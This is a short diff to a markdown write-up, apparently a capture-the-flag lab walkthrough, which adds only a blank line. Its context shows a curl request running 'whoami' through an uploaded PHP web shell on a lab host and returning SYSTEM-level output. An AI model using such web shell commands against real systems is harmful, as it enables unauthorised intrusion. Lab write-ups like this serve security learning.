@@ -80,6 +80,7 @@ Getting SYSTEM Access
 curl "http://10.150.150.11/upload/2/shell.php?cmd=whoami"
 ```
 ![Nmap Scan Results](screenshots/ouptut-webshell.png)
+
 Output: nt authority\system
 
 ## Phase 5: Capturing the Flag
